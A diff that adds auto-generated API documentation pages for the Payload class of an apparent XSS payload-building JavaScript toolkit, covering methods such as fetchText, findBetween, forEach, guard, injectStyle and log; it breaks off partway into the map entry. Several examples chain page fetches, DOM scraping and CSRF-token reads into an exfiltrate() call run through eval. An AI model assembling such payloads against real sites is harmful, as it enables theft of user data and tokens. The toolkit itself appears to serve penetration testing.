+  <div id="params-fetchText" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>url_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+|
+
+<span class="param-type">function</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                </td>
+            
+
+            <td class="description last"><p>URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>options</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">object</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    {}
+                
+                </td>
+            
+
+            <td class="description last"><p>Options passed to fetch (ignored if url_or_func is a function).</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n    * Fetch the supplied url, the response text is then passed in the pipe.\n    *\n    * @param {string|function|Payload} url_or_func URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .\n    * @param {object} [options={}] Options passed to fetch (ignored if url_or_func is a function).\n    * @graph $Payload -> {String | [String, Object]} ($current) {String} -> $Payload\n    * @example\n    * const p new = Payload()\n    *               .fetchText(\"/\")\n    *               .exfiltrate()\n    *\n    * eval(p.run())\n    * @example\n    * const p new = Payload()\n    *               .eval(()=> {\n    *                   return [window.API_URL, {headers: {\"X-CSRF-TOKEN\": window.TOKEN}}]\n    *                 })\n    *               .fetchText()\n    *               .exfiltrate()\n    *\n    * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[13279,13391],"filename":"Payload.js","lineno":367,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001949","name":"Payload#fetchText","type":"MethodDefinition","paramnames":["url_or_func","options"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Fetch the supplied url, the response text is then passed in the pipe.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"String | [String, Object]\",\"label\":\"fetchText(url_or_func, options={})\",\"children\":null,\"returnType\":\"String\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string","function","Payload"]},"description":"<p>URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .</p>","name":"url_or_func"},{"type":{"names":["object"]},"optional":true,"defaultvalue":"{}","description":"<p>Options passed to fetch (ignored if url_or_func is a function).</p>","name":"options"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String | [String, Object]","label":"fetchText(url_or_func, options={})","children":null,"returnType":"String"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p new = Payload()\n              .fetchText(\"/\")\n              .exfiltrate()\n\neval(p.run())"},{"caption":"","code":"const p new = Payload()\n              .eval(()=> {\n                  return [window.API_URL, {headers: {\"X-CSRF-TOKEN\": window.TOKEN}}]\n                })\n              .fetchText()\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"fetchText","longname":"Payload#fetchText","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000158","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"fetchText","signature":"<span class=\"signature\">(url_or_func, options<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line582">582</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="findBetween">
+      <a href="#params-findBetween"><span class="type-signature"></span>findBetween</a><span class="signature">(before, after)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Take the pipe value as a string an search for a string present between to needle, the match is return in the pipe</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String","label":"findBetween(before, after)","children":null,"returnType":"String | null"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchText("/")
+              .findBetween('&lt;title>', '&lt;/title>')
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-findBetween">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-findBetween" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>before</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+
+            
+
+            <td class="description last"><p>String present before the targeted text</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>after</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+
+            
+
+            <td class="description last"><p>String present after the targeted text</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Take the pipe value as a string an search for a string present between to needle, the match is return in the pipe\n     *\n     * @param {string} before String present before the targeted text\n     * @param {string} after String present after the targeted text\n     * @graph $Payload -> {String} ($current) {String | null} -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .fetchText(\"/\")\n     *               .findBetween('<title>', '</title>')\n     *               .exfiltrate()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[21815,22239],"filename":"Payload.js","lineno":582,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002357","name":"Payload#findBetween","type":"MethodDefinition","paramnames":["before","after"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Take the pipe value as a string an search for a string present between to needle, the match is return in the pipe</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"String\",\"label\":\"findBetween(before, after)\",\"children\":null,\"returnType\":\"String | null\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string"]},"description":"<p>String present before the targeted text</p>","name":"before"},{"type":{"names":["string"]},"description":"<p>String present after the targeted text</p>","name":"after"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String","label":"findBetween(before, after)","children":null,"returnType":"String | null"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .fetchText(\"/\")\n              .findBetween('<title>', '</title>')\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"findBetween","longname":"Payload#findBetween","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000174","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"findBetween","signature":"<span class=\"signature\">(before, after)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line183">183</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="forEach">
+      <a href="#params-forEach"><span class="type-signature"></span>forEach</a><span class="signature">(payload)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Take an array from the pipe an call the payload for each element, all calls are made simultaneously.<br>
+<br>
+Each payload take an element from the array as an argument<br></p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"[Any]","label":"forEach(payload)","children":["payload","payload","payload"],"async":true,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchDOM("/")
+              .querySelectorAll("a", "href")
+              .forEach(
+                   Payload.new().fetchText()
+                )
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-forEach">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-forEach" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>payload</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+|
+
+<span class="param-type">function</span>
+
+
+            
+            </td>
+
+            
+
+            
+
+            <td class="description last"><p>to run for each elements of the pipe value,</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Take an array from the pipe an call the payload for each element, all calls are made simultaneously.<br>\n     * <br>\n     * Each payload take an element from the array as an argument<br> \n     * \n     * @graph $Payload -> {[Any]} ($current)[payload,payload,payload]*  -> $Payload\n     * @param {Payload|Function} payload to run for each elements of the pipe value,\n     * @example\n     * const p = Payload.new()\n     *               .fetchDOM(\"/\")\n     *               .querySelectorAll(\"a\", \"href\")\n     *               .forEach(\n     *                    Payload.new().fetchText()\n     *                 )\n     *               .exfiltrate()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[6417,6740],"filename":"Payload.js","lineno":183,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001566","name":"Payload#forEach","type":"MethodDefinition","paramnames":["payload"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Take an array from the pipe an call the payload for each element, all calls are made simultaneously.<br>\n<br>\nEach payload take an element from the array as an argument<br></p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"[Any]\",\"label\":\"forEach(payload)\",\"children\":[\"payload\",\"payload\",\"payload\"],\"async\":true,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"[Any]","label":"forEach(payload)","children":["payload","payload","payload"],"async":true,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"params":[{"type":{"names":["Payload","function"]},"description":"<p>to run for each elements of the pipe value,</p>","name":"payload"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .fetchDOM(\"/\")\n              .querySelectorAll(\"a\", \"href\")\n              .forEach(\n                   Payload.new().fetchText()\n                )\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"forEach","longname":"Payload#forEach","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000144","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"forEach","signature":"<span class=\"signature\">(payload)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line205">205</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="guard">
+      <a href="#params-guard"><span class="type-signature"></span>guard</a><span class="signature">()</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Ensure that the payload will only be run once, usefull when the vulnerable parameter is reflected multiple time.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"guard()","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .guard()
+              .eval(x => alert(x))
+
+eval(p.run()) # call alert()
+eval(p.run()) # raise Guard error</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-guard">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Ensure that the payload will only be run once, usefull when the vulnerable parameter is reflected multiple time.\n     *\n     * @graph $Payload -> ($current) -> $Payload \n     * @example\n     * const p = Payload.new()\n     *               .guard()\n     *               .eval(x => alert(x))\n     *\n     * eval(p.run()) # call alert()\n     * eval(p.run()) # raise Guard error\n     *\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[7212,7487],"filename":"Payload.js","lineno":205,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001636","name":"Payload#guard","type":"MethodDefinition","paramnames":[]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Ensure that the payload will only be run once, usefull when the vulnerable parameter is reflected multiple time.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":null,\"label\":\"guard()\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"guard()","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .guard()\n              .eval(x => alert(x))\n\neval(p.run()) # call alert()\neval(p.run()) # raise Guard error"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"guard","longname":"Payload#guard","kind":"function","memberof":"Payload","scope":"instance","params":[],"___id":"T000002R000146","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"guard","signature":"<span class=\"signature\">()</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line679">679</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="injectStyle">
+      <a href="#params-injectStyle"><span class="type-signature"></span>injectStyle</a><span class="signature">(style_or_func<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Read the pipe value as css and inject a style element on the page.<br>
+<br>
+The pipe value is not modified.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"injectStyle(style_or_func=null)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .eval(() => 'body{background:red}')
+              .injectStyle()
+
+return eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .injectStyle('body{background:red}')
+
+return eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .eval(() => 'red')
+              .injectStyle(color => `body{background:${color}}`)
+
+return eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-injectStyle">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-injectStyle" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>style_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+|
+
+<span class="param-type">function</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    null
+                
+                </td>
+            
+
+            <td class="description last"><p>If style_or_func is a string, then value will be used instead of the pipe value.<br>
+If style_or_func is a function, then return value will be used instead of the pipe value.<br></p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Read the pipe value as css and inject a style element on the page.<br>\n     * <br>\n     * The pipe value is not modified.\n     * @param {string|function|Payload} [style_or_func=null]\n     * If style_or_func is a string, then value will be used instead of the pipe value.<br>\n     * If style_or_func is a function, then return value will be used instead of the pipe value.<br>\n     * @graph $Payload ->  ($current)  -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .eval(() => 'body{background:red}')\n     *               .injectStyle()\n     *\n     * return eval(p.run())\n     * @example\n     * const p = Payload.new()\n     *               .injectStyle('body{background:red}')\n     *\n     * return eval(p.run())\n     * @example\n     * const p = Payload.new()\n     *               .eval(() => 'red')\n     *               .injectStyle(color => `body{background:${color}}`)\n     *\n     * return eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[25358,26141],"filename":"Payload.js","lineno":679,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002544","name":"Payload#injectStyle","type":"MethodDefinition","paramnames":["style_or_func"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Read the pipe value as css and inject a style element on the page.<br>\n<br>\nThe pipe value is not modified.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":null,\"label\":\"injectStyle(style_or_func=null)\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string","function","Payload"]},"optional":true,"defaultvalue":null,"description":"<p>If style_or_func is a string, then value will be used instead of the pipe value.<br>\nIf style_or_func is a function, then return value will be used instead of the pipe value.<br></p>","name":"style_or_func"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"injectStyle(style_or_func=null)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .eval(() => 'body{background:red}')\n              .injectStyle()\n\nreturn eval(p.run())"},{"caption":"","code":"const p = Payload.new()\n              .injectStyle('body{background:red}')\n\nreturn eval(p.run())"},{"caption":"","code":"const p = Payload.new()\n              .eval(() => 'red')\n              .injectStyle(color => `body{background:${color}}`)\n\nreturn eval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"injectStyle","longname":"Payload#injectStyle","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000193","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"injectStyle","signature":"<span class=\"signature\">(style_or_func<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line852">852</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="log">
+      <a href="#params-log"><span class="type-signature"></span>log</a><span class="signature">()</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Log the pipe value in the console, used for debugging purpose <br>
+<br>
+The pipe value is not modified.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"log()","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchDOM("/")
+              .log()
+              .querySelector("title", "innerText")
+              .log()
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-log">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Log the pipe value in the console, used for debugging purpose <br>\n     * <br>\n     * The pipe value is not modified.\n     * @graph $Payload -> {Any} ($current)  -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .fetchDOM(\"/\")\n     *               .log()\n     *               .querySelector(\"title\", \"innerText\")\n     *               .log()\n     *               .exfiltrate()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[31840,31903],"filename":"Payload.js","lineno":852,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100003275","name":"Payload#log","type":"MethodDefinition","paramnames":[]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Log the pipe value in the console, used for debugging purpose <br>\n<br>\nThe pipe value is not modified.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"Any\",\"label\":\"log()\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"log()","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .fetchDOM(\"/\")\n              .log()\n              .querySelector(\"title\", \"innerText\")\n              .log()\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"log","longname":"Payload#log","kind":"function","memberof":"Payload","scope":"instance","params":[],"___id":"T000002R000239","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"log","signature":"<span class=\"signature\">()</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line158">158</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="map">
+      <a href="#params-map"><span class="type-signature"></span>map</a><span class="signature">(payload)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
